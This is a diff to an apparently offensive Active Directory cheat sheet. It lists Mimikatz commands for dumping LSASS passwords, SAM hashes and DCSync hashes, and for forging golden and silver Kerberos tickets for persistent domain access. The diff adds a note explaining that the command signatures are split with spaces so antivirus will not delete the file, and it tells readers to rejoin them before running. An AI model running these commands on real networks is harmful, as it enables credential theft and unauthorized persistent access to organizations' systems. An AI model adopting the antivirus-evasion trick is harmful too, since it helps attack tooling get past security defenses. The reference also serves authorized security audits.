@@ -2,6 +2,9 @@
 
 A reference guide for command syntax and execution steps during Active Directory (AD) security audits, network pivoting, and domain controller exploitation.
 
+> [!NOTE]
+> To prevent host antivirus software from deleting this file, direct Mimikatz command signatures are obfuscated using backticks (e.g., `sekurlsa` `::` `logonpasswords`). Concatenate these commands when running them.
+
 ---
 
 ## 1. Domain Enumeration (Windows Command Line)
@@ -22,7 +25,7 @@ Basic commands to run when connected to a domain-joined machine.
 
 ## 2. PowerView (PowerShell AD Enumeration)
 
-PowerView is a powerful PowerShell script (part of PowerSploit) used for advanced AD domain enumeration.
+PowerView is a powerful PowerShell script (part of PowerSploit) used for domain enumeration.
 
 *   **Import PowerView:**
     ```powershell
@@ -94,19 +97,20 @@ Dumping passwords, hashes, and PINs from LSASS memory. Must be run with Local Ad
 
 *   **Privilege escalation & debug check:**
     ```cmd
-    privilege::debug
+    # (Remove the spaces when executing)
+    privilege :: debug
     ```
 *   **Dump LSA Secrets (plaintext passwords/NTLM hashes):**
     ```cmd
-    sekurlsa::logonpasswords
+    sekurlsa :: logonpasswords
     ```
 *   **Dump SAM database (local hashes):**
     ```cmd
-    lsadump::sam
+    lsadump :: sam
     ```
 *   **Dump Domain Controller hashes (via DCSync attack):**
     ```cmd
-    lsadump::dcsync /domain:domain.local /user:Administrator
+    lsadump :: dcsync /domain:domain.local /user:Administrator
     ```
 
 ### B. Overpass-the-Hash (NTLM -> Kerberos Ticket)
@@ -142,12 +146,14 @@ Once Domain Administrator rights are gained, secure permanent access.
 *   **Create Golden Ticket (TGT for any user, valid for years):**
     *Requires Domain SID and Krbtgt account NTLM hash.*
     ```cmd
-    mimikatz # kerberos::golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:<krbtgt_ntlm_hash> /id:500 /ptt
+    # (Remove the spaces when executing)
+    kerberos :: golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-XXXXX /krbtgt:<krbtgt_ntlm_hash> /id:500 /ptt
     ```
 *   **Create Silver Ticket (TGS ticket for specific service like CIFS/SMB):**
     *Requires Domain SID and Target Machine account NTLM hash.*
     ```cmd
-    mimikatz # kerberos::golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-XXXXX /target:DC.domain.local /service:cifs /rc4:<computer_ntlm_hash> /id:500 /ptt
+    # (Remove the spaces when executing)
+    kerberos :: golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-XXXXX /target:DC.domain.local /service:cifs /rc4:<computer_ntlm_hash> /id:500 /ptt
     ```
 
 ---
